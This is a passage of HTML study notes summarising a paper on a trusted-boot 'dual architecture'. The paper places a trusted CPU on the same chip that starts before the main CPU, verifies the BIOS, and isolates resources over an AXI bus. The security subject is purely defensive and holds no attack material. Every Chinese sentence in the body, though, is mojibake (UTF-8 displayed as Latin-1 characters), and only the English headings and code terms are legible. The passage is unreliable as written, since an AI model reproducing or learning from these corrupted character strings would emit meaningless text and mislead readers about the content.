¹ï¼ˆå¦‚æ›´å®‰å…¨çš„åŠ¨æ€æµ‹é‡è§¦å‘æœºåˆ¶ï¼‰ã€‚</li><li>åœ¨è½¯ä»¶å±‚é¢åŠ å…¥å¤šé‡å†—ä½™æ ¡éªŒå’Œå®Œæ•´æ€§ä¿æŠ¤ã€‚</li></ul></li></ol><h1 id="Design-and-implementation-of-trusted-boot-based-on-a-new-trusted-computing-dual-architecture">Design and implementation of trusted boot based on a new trusted computing dual-architecture</h1><h2 id="Abstract-3">Abstract</h2><p>è®ºæ–‡æå‡ºäº†ä¸€ç§æ–°å‹çš„å¯ä¿¡è®¡ç®—åŒä½“ç³»æ¶æ„ï¼Œç”¨ä»¥è§£å†³ç°æœ‰å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆ<code>TPM</code>ï¼‰æŠ€æœ¯çš„ç¼ºé™·ï¼Œå¦‚æ˜“è¢«ç‰©ç†æ”»å‡»ã€å¯åŠ¨ä¾èµ–CPUç­‰é—®é¢˜ã€‚é€šè¿‡è®¾è®¡å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿå’Œä¼ ç»Ÿè®¡ç®—å­ç³»ç»Ÿçš„åä½œæœºåˆ¶ï¼Œä»¥åŠæ–°çš„å¯ä¿¡å¯åŠ¨æµç¨‹ï¼Œè¯¥æ¶æ„èƒ½å¤Ÿæä¾›æ›´é«˜çš„ç³»ç»Ÿå®‰å…¨æ€§å’Œä¸»åŠ¨é˜²å¾¡èƒ½åŠ›ã€‚</p><h2 id="Introduction-3">Introduction</h2><p>å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆ<code>TPM</code>ï¼‰æ˜¯å½“å‰è®¡ç®—æœºç³»ç»Ÿä¸­æ™®éä½¿ç”¨çš„ä¸€ç§å¯ä¿¡è®¡ç®—æŠ€æœ¯ï¼Œå…¶é€šè¿‡åŠ å¯†æŠ€æœ¯å’Œç¡¬ä»¶æ¨¡å—å®ç°æ•°æ®ä¿æŠ¤å’Œå¹³å°å®Œæ•´æ€§éªŒè¯ã€‚ç„¶è€Œï¼Œç°æœ‰çš„<code>TPM</code>æ¶æ„åœ¨å®é™…åº”ç”¨ä¸­å­˜åœ¨ä»¥ä¸‹ä¸¤å¤§é—®é¢˜ï¼š</p><ol><li><strong>å¯åŠ¨é¡ºåºé—®é¢˜</strong><br>åœ¨ä¼ ç»Ÿæ¶æ„ä¸­ï¼Œ<code>TPM</code>ä½œä¸ºä»è®¾å¤‡ï¼Œå…¶å¯åŠ¨ä¾èµ–äºä¸»CPUçš„åˆå§‹åŒ–ã€‚ä¸»CPUä¼šä¼˜å…ˆåŠ è½½BIOSä»£ç ï¼Œå¹¶è´Ÿè´£åˆå§‹åŒ–<code>TPM</code>ã€‚è¿™ç§æµç¨‹å¸¦æ¥ä¸€ä¸ªå®‰å…¨éšæ‚£ï¼šå¦‚æœBIOSä»£ç é­åˆ°ç¯¡æ”¹ï¼Œä¾‹å¦‚æ³¨å…¥ç—…æ¯’ï¼ˆå¦‚<code>MoonBounce</code>ç—…æ¯’ï¼‰ï¼Œæ•´ä¸ªç³»ç»Ÿçš„ä¿¡ä»»é“¾æ¡å°†è¢«ç ´åã€‚å½“å‰<code>TPM</code>æ¶æ„æ— æ³•ä¿éšœåœ¨ä¸»CPUåŠ è½½å‰å°±å»ºç«‹å¯ä¿¡ç¯å¢ƒã€‚</li><li><strong>ç‰©ç†å®‰å…¨é—®é¢˜</strong><br><code>TPM</code>èŠ¯ç‰‡é€šå¸¸å¤–ç½®å®‰è£…åœ¨ä¸»æ¿ä¸Šï¼Œè¿™è®©å…¶æš´éœ²äºç‰©ç†æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ¢æµ‹è®¾å¤‡æˆªå–<code>TPM</code>æ€»çº¿ä¸Šçš„ä¼ è¾“æ•°æ®ï¼Œç”šè‡³ç‰©ç†ç§»é™¤èŠ¯ç‰‡ä»¥ç¦ç”¨å…¶åŠŸèƒ½ã€‚æ­¤å¤–ï¼Œ<code>TPM</code>ä½œä¸ºä»è®¾å¤‡ï¼Œå…¶æƒé™å—é™ï¼Œæ— æ³•ä¸»åŠ¨æ§åˆ¶æ•´ä¸ªè®¡ç®—ç³»ç»Ÿã€‚</li></ol><p>é’ˆå¯¹ä¸Šè¿°é—®é¢˜ï¼Œæœ¬æ–‡æå‡ºäº†ä¸€ç§å…¨æ–°æ¶æ„ï¼Œæ ¸å¿ƒç›®æ ‡åŒ…æ‹¬ï¼š</p><ul><li><strong>ç¡®ä¿å¯ä¿¡æ¨¡å—å¯åŠ¨ä¼˜å…ˆ</strong>ï¼šè®©ç³»ç»Ÿçš„ç¡¬ä»¶æ ¹ä¿¡ä»»ä¼˜å…ˆäºå…¶ä»–ç»„ä»¶å¯åŠ¨ï¼Œä»¥å»ºç«‹å¯ä¿¡çš„ç³»ç»ŸåŸºç¡€ã€‚</li><li><strong>å¢å¼ºç‰©ç†å®‰å…¨æ€§</strong>ï¼šé€šè¿‡å°†ç¡¬ä»¶æ ¹ä¿¡ä»»æ¨¡å—é›†æˆåˆ°CPUå†…éƒ¨ï¼Œé¿å…å¤–éƒ¨æš´éœ²æ‰€å¸¦æ¥çš„å®‰å…¨éšæ‚£ã€‚</li><li><strong>æ„å»ºå®Œæ•´çš„å¯ä¿¡é“¾æ¡</strong>ï¼šä»ç¡¬ä»¶åˆ°è½¯ä»¶é€å±‚éªŒè¯å’Œä¿æŠ¤ï¼Œç¡®ä¿æ¯ä¸€ç¯èŠ‚çš„å®‰å…¨æ€§ã€‚</li></ul><h2 id="Related-work">Related work</h2><p>å¯ä¿¡è®¡ç®—æŠ€æœ¯è‡ª1971å¹´é¦–æ¬¡æå‡ºä»¥æ¥ï¼Œç»å†äº†æŒç»­çš„å‘å±•ï¼Œå¹¶è¢«å¹¿æ³›åº”ç”¨äºä¿éšœè®¡ç®—æœºç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚å…¶ä¸­ï¼ŒTrusted Computing Group (<code>TCG</code>) çš„å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆ<code>TPM</code>ï¼‰æ˜¯ç›®å‰æœ€å¹¿æ³›ä½¿ç”¨çš„å¯ä¿¡è®¡ç®—æŠ€æœ¯ï¼Œå…¶æœ€æ–°è§„èŒƒTPM 2.0äº2014å¹´å‘å¸ƒï¼Œèƒ½å¤Ÿé€šè¿‡æµ‹é‡å’ŒéªŒè¯æ¥ç¡®ä¿ç³»ç»Ÿè¿è¡Œçš„å¯ä¿¡æ€§ã€‚ç„¶è€Œï¼Œ<code>TPM</code>æŠ€æœ¯ä»ç„¶å­˜åœ¨ä¸€äº›ä¸è¶³ï¼Œä¾‹å¦‚å¯åŠ¨æ¬¡åºæ»åå’Œæ˜“å—ç‰©ç†æ”»å‡»ã€‚</p><p>ä¸ºåº”å¯¹è¿™äº›é—®é¢˜ï¼Œå„å¤§å‚å•†å’Œç ”ç©¶æœºæ„æå‡ºäº†å¤šç§æ”¹è¿›æ–¹æ¡ˆã€‚ä¾‹å¦‚ï¼ŒIBMå¼€å‘äº†åŸºäºPCIeå¡çš„ç¡¬ä»¶åå¤„ç†å™¨ï¼Œé€šè¿‡ç¡¬ä»¶æµ‹é‡å®ç°ç³»ç»Ÿå¯åŠ¨çš„å¯ä¿¡æ€§ï¼›Intelæå‡ºçš„Trusted Execute Technology (<code>TXT</code>) åˆ™åˆ©ç”¨CPUç¡¬ä»¶å’Œå›ºä»¶ï¼Œå®ç°å¯ä¿¡æ‰§è¡Œç¯å¢ƒï¼ˆ<code>TEE</code>ï¼‰å¹¶å¼ºåŒ–å¯åŠ¨è¿‡ç¨‹ã€‚æ­¤å¤–ï¼ŒARM çš„<code>TrustZone</code>æŠ€æœ¯é€šè¿‡ç¡¬ä»¶éš”ç¦»çš„æ–¹å¼åˆ’åˆ†å®‰å…¨ä¸–ç•Œå’Œæ™®é€šä¸–ç•Œï¼Œä¸ºæ•æ„Ÿæ•°æ®æä¾›ç‹¬ç«‹çš„è¿è¡Œç¯å¢ƒã€‚è¿™äº›æŠ€æœ¯è™½ç„¶å„å…·ä¼˜åŠ¿ï¼Œä½†ä»å­˜åœ¨æ¶æ„å¤æ‚æ€§é«˜æˆ–æ˜“è¢«æ”»å‡»ç­‰é—®é¢˜ã€‚</p><p>æ€»ä½“æ¥çœ‹ï¼Œå½“å‰çš„ç ”ç©¶ä¸ºå¯ä¿¡è®¡ç®—æŠ€æœ¯æä¾›äº†è¯¸å¤šå¯å‘ï¼Œä½†ç³»ç»Ÿæ€§åœ°è§£å†³å¯ä¿¡å¯åŠ¨ä¸­çš„ç¼ºé™·ä»éœ€è¦æ–°çš„æ¶æ„æ”¯æŒï¼Œè¿™æ­£æ˜¯æœ¬æ–‡æå‡ºå¯ä¿¡è®¡ç®—åŒä½“ç³»æ¶æ„çš„æ„ä¹‰æ‰€åœ¨ã€‚</p><h2 id="Trusted-computing-dual-architecture-scheme">Trusted computing dual-architecture scheme</h2><h3 id="Design-of-trusted-computing-dual-architecture">Design of trusted computing dual-architecture</h3><p>è¯¥æ–‡æå‡ºçš„å¯ä¿¡è®¡ç®—åŒä½“ç³»æ¶æ„åˆ›æ–°æ€§åœ°å°†ç³»ç»Ÿåˆ’åˆ†ä¸º<strong>ä¼ ç»Ÿè®¡ç®—å­ç³»ç»Ÿ</strong>å’Œ<strong>å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿ</strong>ï¼Œé€šè¿‡ç¡¬ä»¶å¯ä¿¡æ ¹çš„ä¼˜å…ˆå¯åŠ¨ã€èµ„æºéš”ç¦»å’Œé«˜æ•ˆé€šä¿¡æœºåˆ¶ï¼Œæ„å»ºèµ·ä»ç¡¬ä»¶åˆ°è½¯ä»¶çš„å®Œæ•´å¯ä¿¡é“¾æ¡ã€‚åœ¨æ¶æ„è®¾è®¡ã€è¿è¡Œæœºåˆ¶å’Œæ•´ä½“ä¼˜åŠ¿æ–¹é¢ï¼Œä½“ç°å‡ºå¯¹ä¼ ç»ŸTPMæ¶æ„çš„å…¨é¢ä¼˜åŒ–ã€‚</p><h4 id="å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿçš„è®¾è®¡ä¸è¿è¡Œæœºåˆ¶">å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿçš„è®¾è®¡ä¸è¿è¡Œæœºåˆ¶</h4><p>å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿæ˜¯ç³»ç»Ÿå®‰å…¨çš„æ ¸å¿ƒï¼Œå…¶ä¸»è¦åŠŸèƒ½ç”±å¯ä¿¡CPUï¼ˆTrusted CPUï¼‰ä»¥åŠç‹¬ç«‹çš„ç¡¬ä»¶èµ„æºï¼ˆå¦‚<code>ROM</code>ã€<code>SRAM</code>å’ŒåŠ å¯†æ¨¡å—ï¼‰å®ç°ï¼Œå…·å¤‡ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li><strong>ç¡¬ä»¶æ ¹ä¿¡ä»»çš„ä¼˜å…ˆå¯åŠ¨</strong><br>ç³»ç»Ÿä¸Šç”µåï¼Œå¯ä¿¡CPUç‡å…ˆåŠ è½½åµŒå…¥å¼ROMä¸­çš„å¯åŠ¨ä»£ç ï¼ˆ<code>on-chip boot loader</code>ï¼‰ï¼Œå®Œæˆè‡ªèº«åˆå§‹åŒ–å¹¶å¯åŠ¨åŠ å¯†æ¨¡å—ã€‚å¯ä¿¡CPUé€šè¿‡ç‰‡å†…æ€»çº¿è¯»å–å¹¶éªŒè¯å¤–éƒ¨<code>SPIé—ªå­˜</code>ä¸­çš„æ‰©å±•å¯åŠ¨ä»£ç ï¼ˆ<code>off-chip boot loader</code>ï¼‰å’ŒBIOSã€‚éªŒè¯å®Œæˆåï¼Œä¼ ç»Ÿè®¡ç®—å­ç³»ç»Ÿæ‰ä¼šè¢«å…è®¸å¯åŠ¨ï¼Œç¡®ä¿æ•´ä¸ªå¯åŠ¨è¿‡ç¨‹è‡ªç¡¬ä»¶å±‚é¢å³å—åˆ°ä¿¡ä»»ã€‚</li><li><strong>ç‹¬ç«‹çš„ç¡¬ä»¶èµ„æºä¸æƒé™éš”ç¦»</strong><br>å¯ä¿¡CPUé€šè¿‡ä¸“å±çš„ROMå­˜å‚¨ä¸å¯ç¯¡æ”¹çš„å¯åŠ¨ä»£ç å’Œå¯†é’¥ï¼Œåˆ©ç”¨<code>SRAM</code>æ‰§è¡Œå¯ä¿¡è®¡ç®—ä»»åŠ¡ï¼Œå¹¶ä½¿ç”¨åŠ å¯†æ¨¡å—ï¼ˆå¦‚<code>AES</code>ã€<code>SHA</code>å’Œ<code>ECDSA</code>ï¼‰å¯¹å¤–éƒ¨æ•°æ®è¿›è¡ŒéªŒè¯ã€‚å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿçš„æ‰€æœ‰èµ„æºå¯¹ä¼ ç»Ÿè®¡ç®—å­ç³»ç»Ÿå®Œå…¨éš”ç¦»ï¼Œä½†å¯ä¿¡CPUå¯é€šè¿‡æ€»çº¿è®¿é—®ä¼ ç»Ÿå­ç³»ç»Ÿçš„èµ„æºï¼Œå®ç°ä¸»åŠ¨çš„å®‰å…¨ç›‘æ§ã€‚</li><li><strong>åˆ†ç¦»çš„ç”µæºåŸŸè®¾è®¡</strong><br>å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿå’Œä¼ ç»Ÿå­ç³»ç»Ÿåˆ†åˆ«ä½äºä¸¤ä¸ªç‹¬ç«‹çš„ç”µæºåŸŸä¸­ã€‚å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿä¼˜å…ˆä¸Šç”µå¹¶å®Œæˆåˆå§‹åŒ–ï¼Œç„¶åæ§åˆ¶ä¼ ç»Ÿè®¡ç®—å­ç³»ç»Ÿçš„ä¸Šç”µæµç¨‹ï¼Œé¿å…ä¼ ç»Ÿæ¶æ„ä¸­ç”±äºå¯åŠ¨é¡ºåºé”™è¯¯å¯¼è‡´çš„æ½œåœ¨å®‰å…¨æ¼æ´ã€‚</li></ul><p>é€šè¿‡å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿçš„ç‹¬ç«‹è®¾è®¡å’Œä¼˜å…ˆå¯åŠ¨æœºåˆ¶ï¼Œæ¶æ„æœ‰æ•ˆè§£å†³äº†ä¼ ç»ŸTPMæ¶æ„åœ¨å¯åŠ¨å¯ä¿¡æ€§å’Œæƒé™æ§åˆ¶ä¸Šçš„é—®é¢˜ã€‚</p><h4 id="æ¶æ„å†…é€šä¿¡ä¸åä½œæœºåˆ¶">æ¶æ„å†…é€šä¿¡ä¸åä½œæœºåˆ¶</h4><p>å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿä¸ä¼ ç»Ÿè®¡ç®—å­ç³»ç»Ÿé€šè¿‡é«˜æ€§èƒ½ç‰‡å†…æ€»çº¿ï¼ˆå¦‚<code>AXIæ€»çº¿</code>ï¼‰å®ç°é€šä¿¡å’Œåä½œï¼Œä¼˜åŒ–äº†ç³»ç»Ÿçš„æ•ˆç‡å’Œå®‰å…¨æ€§ï¼š</p><ul><li><strong>ç‰‡å†…æ€»çº¿çš„é«˜æ€§èƒ½è®¾è®¡</strong><br>é‡‡ç”¨å…ˆè¿›å¯æ‰©å±•æ¥å£ï¼ˆ<code>AXI</code>ï¼‰æ€»çº¿ä½œä¸ºç‰‡å†…é€šä¿¡æ ¸å¿ƒã€‚<code>AXI</code>æ€»çº¿æ”¯æŒå¤šä¸»å¤šä»æ¨¡å¼ï¼Œå…¶ä¸­å¯ä¿¡CPUä½œä¸ºä¸»è®¾å¤‡æ‹¥æœ‰æ›´é«˜æƒé™ï¼Œå¯ä»¥è®¿é—®ä¼ ç»Ÿè®¡ç®—å­ç³»ç»Ÿçš„æ‰€æœ‰èµ„æºï¼ˆå¦‚å†…å­˜ã€BIOSå’Œå¤–éƒ¨å­˜å‚¨ï¼‰ã€‚è€Œä¼ ç»Ÿå­ç³»ç»Ÿåˆ™æ— æ³•è®¿é—®å¯ä¿¡å­ç³»ç»Ÿçš„èµ„æºï¼Œä»è€Œå®ç°èµ„æºéš”ç¦»ä¸æƒé™æ§åˆ¶ã€‚</li><li><strong>æ›´é«˜çš„ä¼ è¾“æ•ˆç‡</strong><br>ç›¸è¾ƒäºä¼ ç»Ÿä¸»æ¿ä¸Šçš„<code>SPI</code>æ€»çº¿ï¼Œç‰‡å†…<code>AXI</code>æ€»çº¿å…·æœ‰æ›´å®½çš„æ•°æ®é€šé“ï¼ˆæ”¯æŒ8è‡³1024ä½ï¼‰å’Œæ›´é«˜çš„æ—¶é’Ÿé¢‘ç‡ï¼ˆæœ€é«˜å¯è¾¾200 MHzï¼‰ã€‚è¿™ç§è®¾è®¡æ˜¾è‘—æå‡äº†æ•°æ®ä¼ è¾“é€Ÿç‡å’Œè¿è¡Œæ•ˆç‡ï¼Œå¹¶é™ä½äº†å»¶è¿Ÿã€‚</li><li><strong>åŠ¨æ€ç›‘æ§ä¸ä¸»åŠ¨éªŒè¯</strong><br>åœ¨ç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯ä¿¡CPUé€šè¿‡<code>AXI</code>æ€»çº¿å®æ—¶è®¿é—®ä¼ ç»Ÿå­ç³»ç»Ÿçš„èµ„æºï¼Œå¹¶æ‰§è¡Œå®‰å…¨ç­–ç•¥ï¼Œä¾‹å¦‚å®šæœŸæµ‹é‡å†…å­˜çš„å®Œæ•´æ€§æˆ–åŠ¨æ€éªŒè¯BIOSçš„å®‰å…¨æ€§ï¼Œä»è€Œç¡®ä¿æ•´ä¸ªç³»ç»Ÿå§‹ç»ˆå¤„äºå¯ä¿¡çŠ¶æ€ã€‚</li></ul><p>è¿™ç§ç‰‡å†…é«˜é€Ÿæ€»çº¿çš„è®¾è®¡ä¸ä»…æå‡äº†æ¶æ„çš„æ•´ä½“æ€§èƒ½ï¼Œè¿˜é€šè¿‡ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶å¼ºåŒ–äº†èµ„æºä¿æŠ¤ã€‚</p><h4 id="ç¡¬ä»¶å¯ä¿¡æ ¹çš„é›†æˆä¸è®¾è®¡ä¼˜åŠ¿">ç¡¬ä»¶å¯ä¿¡æ ¹çš„é›†æˆä¸è®¾è®¡ä¼˜åŠ¿</h4><p>ç¡¬ä»¶å¯ä¿¡æ ¹çš„é›†æˆè®¾è®¡æ˜¯æœ¬æ–‡æ¶æ„çš„é‡è¦åˆ›æ–°ï¼Œçªç ´äº†ä¼ ç»ŸTPMèŠ¯ç‰‡å¤–ç½®çš„é™åˆ¶ï¼Œä¸ºç³»ç»Ÿå¸¦æ¥äº†æ›´é«˜çš„å®‰å…¨æ€§å’Œæ€§èƒ½ï¼š</p><ol><li><strong>ç¡¬ä»¶æ ¹ä¿¡ä»»çš„èŠ¯ç‰‡å†…é›†æˆ</strong><br>ç¡¬ä»¶æ ¹ä¿¡ä»»æ¨¡å—ï¼ˆTrusted CPUï¼‰ç›´æ¥è®¾è®¡ä¸ºCPUèŠ¯ç‰‡ä¸Šçš„ä¸€ä¸ªIPæ¨¡å—ï¼Œä¸ä¼ ç»Ÿè®¡ç®—CPUå…±ç”¨åŒä¸€å—ç¡…ç‰‡ã€‚å…¶è®¾è®¡æ–¹æ³•åŒ…æ‹¬ï¼š<ul><li><strong>ç¡¬ä»¶èµ„æºå…±äº«ä¸éš”ç¦»</strong>ï¼šå¯ä¿¡CPUé€šè¿‡å…±äº«çš„ç‰‡å†…æ€»çº¿ä¸å…¶ä»–IPæ¨¡å—ï¼ˆå¦‚å†…å­˜æ§åˆ¶å™¨ï¼‰äº¤äº’ï¼Œä½†å¯ä¿¡CPUç‹¬å <code>ROM</code>å’Œ<code>SRAM</code>ç­‰å…³é”®èµ„æºï¼Œä¿éšœå®‰å…¨æ€§ã€‚</li><li><strong>åˆ¶é€ è¿‡ç¨‹ä¸­çš„å›ºåŒ–</strong>ï¼šå¯ä¿¡CPUçš„å¯åŠ¨ä»£ç å’Œå¯†é’¥åœ¨èŠ¯ç‰‡åˆ¶é€ è¿‡ç¨‹ä¸­å›ºåŒ–åˆ°ROMä¸­ï¼Œè¿™ç§è®¾è®¡ç¡®ä¿äº†å¯ä¿¡æ ¹çš„ä¸å¯ç¯¡æ”¹æ€§ã€‚</li></ul></li><li><strong>ç‰‡å†…é«˜é€Ÿæ€»çº¿çš„å®ç°</strong><br>å¯ä¿¡CPUå’Œä¼ ç»ŸCPUé€šè¿‡ç‰‡å†…<code>AXI</code>æ€»çº¿è¿æ¥ï¼Œè¯¥æ€»çº¿åœ¨è®¾è®¡ä¸Šå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š<ul><li><strong>å¤šä¸»å¤šä»æ¶æ„</strong>ï¼š<code>AXI</code>æ€»çº¿å…è®¸å¤šä¸ªä¸»è®¾å¤‡ï¼ˆå¦‚å¯ä¿¡CPUå’Œä¼ ç»ŸCPUï¼‰åŒæ—¶è®¿é—®å¤šä¸ªä»è®¾å¤‡ï¼ˆå¦‚å†…å­˜å’Œ<code>SPI</code>æ§åˆ¶å™¨ï¼‰ã€‚</li><li><strong>æƒé™ç®¡ç†æœºåˆ¶</strong>ï¼šé€šè¿‡åˆ†é…è®¾å¤‡IDå’Œè®¿é—®æƒé™ï¼Œç¡®ä¿ä¼ ç»Ÿå­ç³»ç»Ÿæ— æ³•è®¿é—®å¯ä¿¡å­ç³»ç»Ÿçš„ä¸“å±èµ„æºï¼Œè€Œå¯ä¿¡CPUå¯ä¸»åŠ¨æ§åˆ¶ä¼ ç»Ÿå­ç³»ç»Ÿçš„èµ„æºè®¿é—®æƒé™ã€‚</li><li><strong>æ•°æ®åŠ å¯†ä¸ä¿æŠ¤</strong>ï¼šæ€»çº¿é€šä¿¡çš„æ•°æ®å¯é€šè¿‡ç¡¬ä»¶åŠ é€Ÿçš„åŠ å¯†æ¨¡å—ï¼ˆå¦‚<code>AES</code>ï¼‰åŠ å¯†ä¼ è¾“ï¼Œè¿›ä¸€æ­¥å¢å¼ºå®‰å…¨æ€§ã€‚</li></ul></li><li><strong>è®¾è®¡ä¼˜åŠ¿çš„ç»¼åˆä½“ç°</strong><ul><li><strong>å¯åŠ¨å¯ä¿¡æ€§</strong>ï¼šå¯ä¿¡CPUä¼˜å…ˆå¯åŠ¨å¹¶å¯¹BIOSç­‰å¤–éƒ¨æ•°æ®è¿›è¡ŒéªŒè¯ï¼Œä»ç¡¬ä»¶å±‚é¢æ„å»ºèµ·å®Œæ•´çš„å¯ä¿¡é“¾æ¡ã€‚</li><li><strong>ç‰©ç†å®‰å…¨æ€§å¢å¼º</strong>ï¼šå¯ä¿¡CPUä¸è®¡ç®—CPUå…±ç”¨ä¸€å—èŠ¯ç‰‡ï¼Œæ¶ˆé™¤äº†<code>TPM</code>å¤–ç½®èŠ¯ç‰‡æ˜“è¢«æ‹†å¸æˆ–ç›‘æ§çš„ç‰©ç†å®‰å…¨éšæ‚£ã€‚</li><li><strong>è¿è¡Œæ•ˆç‡ä¼˜åŒ–</strong>ï¼šç‰‡å†…é«˜é€Ÿæ€»çº¿æå¤§æå‡äº†æ•°æ®ä¼ è¾“é€Ÿç‡ï¼Œå‡å°‘äº†ä¼ ç»Ÿæ¶æ„ä¸­çš„å¯åŠ¨æ—¶é—´å»¶è¿Ÿã€‚</li></ul></li></ol><p>é€šè¿‡ç¡¬ä»¶å¯ä¿¡æ ¹çš„é›†æˆå’Œç‰‡å†…æ€»çº¿çš„ä¼˜åŒ–è®¾è®¡ï¼Œæœ¬æ–‡æ¶æ„ä¸ä»…åœ¨å¯åŠ¨å¯ä¿¡æ€§å’Œç‰©ç†å®‰å…¨æ€§ä¸Šå–å¾—äº†çªç ´ï¼Œè¿˜æ˜¾è‘—æå‡äº†ç³»ç»Ÿæ€§èƒ½ï¼Œä¸ºå¯ä¿¡è®¡ç®—æä¾›äº†å…¨æ–°çš„è§£å†³æ–¹æ¡ˆã€‚</p><h3 id="Advantages-of-trusted-computing-dual-architecture">Advantages of trusted computing dual-architecture</h3><p>æœ¬æ–‡æå‡ºçš„å¯ä¿¡è®¡ç®—åŒä½“ç³»æ¶æ„é€šè¿‡ç¡¬ä»¶å¯ä¿¡æ ¹çš„é›†æˆã€ä¼˜å…ˆå¯åŠ¨å’Œç³»ç»Ÿçº§ä¼˜åŒ–ï¼Œæ˜¾è‘—æå‡äº†è®¡ç®—æœºç³»ç»Ÿçš„å®‰å…¨æ€§å’Œæ€§èƒ½ã€‚</p><h4 id="å¯åŠ¨å¯ä¿¡æ€§">å¯åŠ¨å¯ä¿¡æ€§</h4><p>å¯ä¿¡è®¡ç®—åŒä½“ç³»æ¶æ„é€šè¿‡ç¡¬ä»¶å¯ä¿¡æ ¹ï¼ˆTrusted CPUï¼‰çš„ä¼˜å…ˆå¯åŠ¨ï¼Œç¡®ä¿ç³»ç»Ÿä»æœ€åº•å±‚ç¡¬ä»¶å¼€å§‹æ„å»ºå¯ä¿¡é“¾æ¡ï¼š</p><ul><li><strong>ç¡¬ä»¶ä¼˜å…ˆå¯åŠ¨</strong>ï¼šç³»ç»Ÿé€šç”µåï¼Œå¯ä¿¡CPUé¦–å…ˆåˆå§‹åŒ–è‡ªèº«å¹¶åŠ è½½å†…åµŒROMä¸­çš„å¯åŠ¨ä»£ç ï¼ˆ<code>on-chip boot loader</code>ï¼‰ã€‚å¯ä¿¡CPUå®Œæˆè‡ªèº«åˆå§‹åŒ–åï¼Œé€šè¿‡ç‰‡å†…é«˜é€Ÿæ€»çº¿è¯»å–å¹¶éªŒè¯æ‰©å±•å¯åŠ¨ä»£ç å’ŒBIOSçš„å®Œæ•´æ€§ï¼Œç¡®ä¿å¯åŠ¨æµç¨‹çš„æ¯ä¸€æ­¥éƒ½å¯ä¿¡ã€‚</li><li><strong>é€å±‚éªŒè¯çš„å¯ä¿¡é“¾</strong>ï¼šä»å¯ä¿¡CPUåˆ°BIOSï¼Œå†åˆ°æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºï¼Œå¯ä¿¡CPUé€šè¿‡åŠ å¯†æŠ€æœ¯ï¼ˆå¦‚<code>SHA</code>å’Œ<code>ECDSA</code>ï¼‰é€å±‚æµ‹é‡å’ŒéªŒè¯æ¯ä¸€ç¯èŠ‚çš„å®Œæ•´æ€§ã€‚è‹¥æ£€æµ‹åˆ°ä»»ä½•ç¯¡æ”¹ï¼Œç³»ç»Ÿä¼šä¸­æ­¢å¯åŠ¨å¹¶å‘å‡ºè­¦æŠ¥ã€‚</li><li><strong>é¿å…BIOSç¯¡æ”¹é£é™©</strong>ï¼šä¼ ç»Ÿ<code>TPM</code>æ¶æ„ä¸­BIOSä¼˜å…ˆå¯åŠ¨çš„è®¾è®¡æ˜“å¯¼è‡´å®‰å…¨æ¼æ´ï¼Œè€ŒåŒä½“ç³»æ¶æ„é€šè¿‡å¯ä¿¡CPUæ§åˆ¶BIOSåŠ è½½çš„å…ˆå†³æ¡ä»¶ï¼Œå®Œå…¨è§„é¿äº†æ­¤ç±»é£é™©ã€‚</li></ul><p>è¿™ç§é€æ­¥é€’è¿›çš„éªŒè¯æ–¹å¼ä½¿ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹åœ¨ç¡¬ä»¶çº§åˆ«å’Œé€»è¾‘çº§åˆ«éƒ½è¾¾åˆ°é«˜åº¦å¯ä¿¡ã€‚</p><h4 id="ç‰©ç†å®‰å…¨æ€§">ç‰©ç†å®‰å…¨æ€§</h4><p>é€šè¿‡å°†ç¡¬ä»¶å¯ä¿¡æ ¹é›†æˆåˆ°CPUå†…éƒ¨ï¼Œæ¶æ„åœ¨ç‰©ç†å®‰å…¨æ€§ä¸Šå–å¾—äº†æ˜¾è‘—æå‡ï¼š</p><ul><li><strong>å†…åµŒè®¾è®¡çš„ä¸å¯ç¯¡æ”¹æ€§</strong>ï¼šå¯ä¿¡CPUè¢«é›†æˆä¸ºCPUèŠ¯ç‰‡ä¸Šçš„IPæ¨¡å—ï¼Œä¸ä¼ ç»Ÿè®¡ç®—CPUå…±äº«åŒä¸€ç¡…ç‰‡ã€‚å¯ä¿¡CPUå†…çš„å¯åŠ¨ä»£ç å’Œæ ¹å¯†é’¥åœ¨èŠ¯ç‰‡åˆ¶é€ è¿‡ç¨‹ä¸­å›ºåŒ–åˆ°ROMä¸­ï¼Œç¡®ä¿å…¶æ— æ³•è¢«ç¯¡æ”¹æˆ–æ›¿æ¢ã€‚</li><li><strong>é˜²æ­¢ç‰©ç†æ”»å‡»</strong>ï¼šä¼ ç»Ÿ<code>TPM</code>èŠ¯ç‰‡ç”±äºå¤–ç½®è®¾è®¡æ˜“å—ç¡¬ä»¶æ”»å‡»ï¼ˆå¦‚æ¢æµ‹ä¼ è¾“æ€»çº¿ã€ç‰©ç†æ‹†å¸ç­‰ï¼‰ï¼Œè€ŒåŒä½“ç³»æ¶æ„é€šè¿‡å†…åµŒè®¾è®¡å®Œå…¨æ¶ˆé™¤äº†å¤–éƒ¨æ”»å‡»é¢ã€‚å¯ä¿¡è®¡ç®—å­ç³»ç»Ÿçš„ç‹¬ç«‹èµ„æºå’Œç‰‡å†…é€šä¿¡æœºåˆ¶è¿›ä¸€æ­¥å¼ºåŒ–äº†å¯¹å…³é”®æ•°æ®çš„ä¿æŠ¤ã€‚</li><li><strong>å®‰å…¨çš„æ•°æ®ä¼ è¾“</strong>ï¼šç‰‡å†…é«˜é€Ÿæ€»çº¿é€šè¿‡è®¿é—®æƒé™ç®¡ç†æœºåˆ¶å’Œç¡¬ä»¶åŠ 